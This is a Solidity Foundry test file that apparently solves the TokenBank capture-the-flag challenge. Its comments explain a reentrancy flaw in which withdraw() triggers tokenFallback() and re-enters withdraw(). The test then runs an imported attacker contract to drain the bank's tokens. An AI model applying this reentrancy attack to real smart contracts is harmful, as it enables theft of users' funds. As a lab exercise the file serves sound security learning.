// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";
import {Test} from "forge-std/Test.sol";
import {TokenBankChallenge, TokenBankAttacker} from "../src/TokenBank.sol";

/**
 * @title TokenBank Exploit Test
 * @notice Demonstrates exploitation of token withdrawal logic
 *
 * @dev The vulnerability exists because:
 * - The contract does not properly handle token return logic in `withdraw()`
 * - `TokenBankAttacker` can manipulate the token balance in the bank
 *
 * Attack flow:
 * 1. `TokenBankAttacker` interacts with `TokenBankChallenge`
 * 2. Calls `withdraw()` which triggers `tokenFallback()` in `TokenBankAttacker`
 * 3. In `tokenFallback()`, `TokenBankAttacker` can call `withdraw()` again to extract more tokens than allowed
 */
interface IToken {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value, bytes memory data) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        address tokenAddress = address(tokenBankChallenge.token());
        uint256 TOKEN_AMOUNT = tokenBankAttacker.TOKEN_AMOUNT();

        vm.startPrank(player);
        tokenBankChallenge.withdraw(TOKEN_AMOUNT);
        IToken(tokenAddress).transfer(address(tokenBankAttacker), TOKEN_AMOUNT);
        tokenBankAttacker.withdraw(TOKEN_AMOUNT / 2);
        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal view {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
